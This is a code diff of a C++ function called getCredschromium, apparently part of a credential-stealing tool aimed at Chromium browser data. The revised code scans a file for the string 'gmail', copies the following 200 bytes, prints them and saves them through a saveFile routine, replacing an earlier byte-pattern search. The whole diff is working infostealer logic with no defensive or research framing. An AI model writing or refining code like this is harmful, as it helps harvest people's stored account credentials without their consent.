@@ -2,8 +2,6 @@
 #include <iostream>
 #include <fstream>
 #include <vector>
-#include <string>
-#include <sstream>
 #include "../core/saveFile.h"
 
 int getCredschromium(std::string filename) {
@@ -14,41 +12,39 @@ int getCredschromium(std::string filename) {
         return 1;
     }
 
-    // Specify your search pattern here
-    std::vector<unsigned char> searchPattern = { 0x20, 0x2D, 0x20, 0x68, 0x74, 0x74, 0x70, 0x73, 0x20, 0x77, 0x00 };
-
-    // Initialize variables to count consecutive spaces
-    int consecutiveSpaces = 0;
+    std::string searchSequence = "gmail";
+    std::vector<char> foundData;
 
     while (!file.eof()) {
-        unsigned char c;
-        file.read(reinterpret_cast<char*>(&c), sizeof(c));
+        char c;
+        file.get(c);
 
-        // Check if the character matches the search pattern
-        if (c == searchPattern[consecutiveSpaces]) {
-            consecutiveSpaces++;
+        if (c == searchSequence[foundData.size()]) {
+            foundData.push_back(c);
+            if (foundData.size() == searchSequence.size()) {
+                // We found the search sequence, now collect the next 200 binary characters
+                std::vector<char> extractedData;
+                for (int i = 0; i < 200; i++) {
+                    file.get(c);
+                    if (file.eof()) {
+                        break;
+                    }
+                    extractedData.push_back(c);
+                }
 
-            if (consecutiveSpaces == searchPattern.size()) {
-                // Pattern found, rewind to collect the 100 characters before the pattern
-                std::vector<unsigned char> buffer(100, 0);
-
-                file.seekg(-static_cast<int>(buffer.size()), std::ios::cur);
-                file.read(reinterpret_cast<char*>(buffer.data()), buffer.size());
-
-                // Convert the buffer to a UTF-8 string
-                std::string utf8Data(buffer.begin(), buffer.end());
-
-                // Print the UTF-8 string
-                std::cout << "Pattern Data: " + utf8Data << std::endl;
+                // Print the extracted data as UTF-8
+                std::string utf8ExtractedData(extractedData.begin(), extractedData.end());
+                std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;  // Add a newline
 
                 //Save into file
-                saveFile(utf8Data);
+                saveFile(utf8ExtractedData);
 
-                consecutiveSpaces = 0;
+                // Clear the foundData vector to search for the next occurrence
+                foundData.clear();
             }
         }
         else {
-            consecutiveSpaces = 0;
+            foundData.clear();
         }
     }
 
